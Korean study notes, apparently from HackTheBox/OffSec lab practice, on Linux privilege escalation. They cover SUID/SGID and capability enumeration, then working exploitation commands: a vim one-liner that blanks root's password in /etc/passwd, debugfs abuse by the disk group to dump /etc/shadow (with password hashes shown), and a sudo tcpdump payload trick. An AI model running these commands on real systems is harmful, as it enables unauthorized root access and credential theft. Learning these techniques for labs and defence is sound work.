### 특수 권한 탐색 (SUID, SGID)
```bash
# SUID 탐색
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# SGID 탐색
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### Capabilities
Linux Capabilities 는 Linux 운영 체제의 보안 기능으로, 프로세스에 특정 권한을 부여하여 그렇지 않으면 제한될 수 있는 특정 작업을 수행할 수 있도록 한다. Ubuntu에서는 `setcap` 명령으로 특정 파일에 대한 기능을 설정할 수 있다.

**Capabilities 설정 예시**

```powershell
hunji@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
→ 바이너리가 네트워크 포트에 바인딩 가능

특히나 관리자 권한으로 작업을 수행할 수 있도록 하는 `cap_sys_admin` 과 같은 기능은 제대로 사용하지 않으면 위험하다.

| **능력**                 | **설명**                                                                      |
| ---------------------- | --------------------------------------------------------------------------- |
| `cap_sys_admin`        | 시스템 파일을 수정하거나 시스템 설정을 변경하는 등 관리자 권한으로 작업을 수행할 수 있습니다.                       |
| `cap_sys_chroot`       | 현재 프로세스의 루트 디렉토리를 변경해서 다른 방법으로는 접근할 수 없는 파일과 디렉토리에 접근할 수 있도록 해줍니다.          |
| `cap_sys_ptrace`       | 다른 프로세스에 연결하여 디버깅을 수행할 수 있으므로, 잠재적으로 중요한 정보에 접근하거나 다른 프로세스의 동작을 수정할 수 있습니다. |
| `cap_sys_nice`         | 프로세스의 우선순위를 높이거나 낮출 수 있으며, 이를 통해 원래는 제한되었을 리소스에 접근할 수 있게 됩니다.               |
| `cap_sys_time`         | 시스템 시계를 수정하여 타임스탬프를 조작하거나 다른 프로세스가 예상치 못한 방식으로 작동하도록 할 수 있습니다.              |
| `cap_sys_resource`     | 시스템 리소스 제한(예: 열려 있는 파일 기술자의 최대 수 또는 할당할 수 있는 최대 메모리 양)을 수정할 수 있습니다.         |
| `cap_sys_module`       | 커널 모듈을 로드하고 언로드할 수 있으므로 운영 체제의 동작을 수정하거나 중요한 정보에 액세스할 수 있는 가능성이 있습니다.       |
| `cap_net_bind_service` | 네트워크 포트에 바인딩하여 민감한 정보에 접근하거나 승인되지 않은 작업을 수행할 가능성이 있습니다.                     |

|**역량 가치**|**설명**|
|---|---|
|`=`|이 값은 실행 파일에 대해 지정된 기능을 설정하지만, 어떠한 권한도 부여하지 않습니다. 실행 파일에 대해 이전에 설정된 기능을 지우고 싶을 때 유용할 수 있습니다.|
|`+ep`|이 값은 지정된 기능에 대한 유효하고 허용되는 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행할 수 있지만 기능이 허용하지 않는 작업은 수행할 수 없습니다.|
|`+ei`|이 값은 지정된 기능에 대한 충분하고 상속 가능한 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행하고 실행 파일에 의해 생성된 자식 프로세스는 기능을 상속하고 동일한 작업을 수행할 수 있습니다.|
|`+p`|이 값은 지정된 기능에 대해 허용된 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행할 수 있지만 기능이 허용하지 않는 작업은 수행할 수 없습니다. 실행 파일에 기능을 부여하지만 기능을 상속하거나 자식 프로세스가 상속하는 것을 방지하려는 경우 유용할 수 있습니다.|

다음과 같은 Linux Capabilities 는 root로 권한 상승을 할 때 사용할 수 있다.

|**능력**|**설명**|
|---|---|
|`cap_setuid`|프로세스가 유효 사용자 ID를 설정할 수 있게 하며, 이를 통해 `root` 사용자를 포함한 다른 사용자의 권한을 얻을 수 있습니다 .|
|`cap_setgid`|다른 그룹(`root` 그룹 포함)의 권한을 얻는 데 사용할 수 있는 유효 그룹 ID를 설정할 수 있습니다 .|
|`cap_sys_admin`|`root`이 기능은 시스템 설정 수정, 파일 시스템 마운트 및 마운트 해제 등 사용자 에게 예약된 많은 작업을 수행하는 기능을 포함하여 광범위한 관리자 권한을 제공합니다 .|
|`cap_dac_override`|파일 읽기, 쓰기, 실행 권한 검사를 우회할 수 있습니다.|

### Enumerating Capabilities

```powershell
hunji@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

→ offsec에서는 `/usr/sbin/getcap -r / 2>/dev/null` 로 검색

### Exploitation

**Capability 확인**
```powershell
hunji@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

파일 읽기, 쓰기, 실행 권한 검사를 우회할 수 있으므로, /etc/passwd 파일을 아래와 같이 편집할 수 있다.
```powershell
hunji@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

비대화형 모드에서도 변경으로 root 의 패스워드를 없애버릴 수 있다 (x 를 없애버림).
```powershell
hunji@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd
hunji@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

### Sudo 권한 탐색
```bash
# sudo 권한 확인
sudo -l
```

### disk 그룹 exploit
```sh
dora@dora:~$ df -h  
Filesystem Size Used Avail Use% Mounted on  
/dev/mapper/ubuntu--vg-ubuntu--lv 9.8G 5.2G 4.2G 56% /  
udev 947M 0 947M 0% /dev  
tmpfs 992M 832K 991M 1% /dev/shm  
tmpfs 199M 1.2M 198M 1% /run  
tmpfs 5.0M 0 5.0M 0% /run/lock  
tmpfs 992M 0 992M 0% /sys/fs/cgroup  
/dev/sda2 1.7G 209M 1.4G 13% /boot  
/dev/loop0 62M 62M 0 100% /snap/core20/1611  
/dev/loop3 50M 50M 0 100% /snap/snapd/18596  
/dev/loop2 68M 68M 0 100% /snap/lxd/22753  
/dev/loop1 64M 64M 0 100% /snap/core20/1852  
/dev/loop4 92M 92M 0 100% /snap/lxd/24061  
tmpfs 199M 0 199M 0% /run/user/1000  
  
// reading the shadow file using debugfs for cracking the password  
dora@dora:~$ debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv  
debugfs 1.45.5 (07-Jan-2020)  
debugfs: cat /etc/shadow  
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::  
daemon:*:19235:0:99999:7:::  
bin:*:19235:0:99999:7:::  
sys:*:19235:0:99999:7:::  
sync:*:19235:0:99999:7:::  
games:*:19235:0:99999:7:::  
man:*:19235:0:99999:7:::  
lp:*:19235:0:99999:7:::  
mail:*:19235:0:99999:7:::  
news:*:19235:0:99999:7:::  
uucp:*:19235:0:99999:7:::  
proxy:*:19235:0:99999:7:::  
www-data:*:19235:0:99999:7:::  
backup:*:19235:0:99999:7:::  
list:*:19235:0:99999:7:::  
irc:*:19235:0:99999:7:::  
gnats:*:19235:0:99999:7:::  
nobody:*:19235:0:99999:7:::  
systemd-network:*:19235:0:99999:7:::  
systemd-resolve:*:19235:0:99999:7:::  
systemd-timesync:*:19235:0:99999:7:::  
messagebus:*:19235:0:99999:7:::  
syslog:*:19235:0:99999:7:::  
_apt:*:19235:0:99999:7:::  
tss:*:19235:0:99999:7:::  
uuidd:*:19235:0:99999:7:::  
tcpdump:*:19235:0:99999:7:::  
landscape:*:19235:0:99999:7:::  
pollinate:*:19235:0:99999:7:::  
usbmux:*:19381:0:99999:7:::  
sshd:*:19381:0:99999:7:::  
systemd-coredump:!!:19381::::::  
lxd:!:19381::::::  
fwupd-refresh:*:19381:0:99999:7:::  
dora:$6$PkzB/mtNayFM5eVp$b6LU19HBQaOqbTehc6/LEk8DC2NegpqftuDDAvOK20c6yf3dFo0esC0vOoNWHqvzF0aEb3jxk39sQ/S4vGoGm/:19453:0:99999:7:::

# 이후는 root 의 .ssh/id_rsa 크랙
# 또는 root의 shadow 파일 크랙
```
참고: https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----b14a6e535e1f---------------------------------------

### Exploit
https://gtfobins.github.io/ 를 참고해서 exploit
```bash
# sudo tcpdump 악용 예시
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```


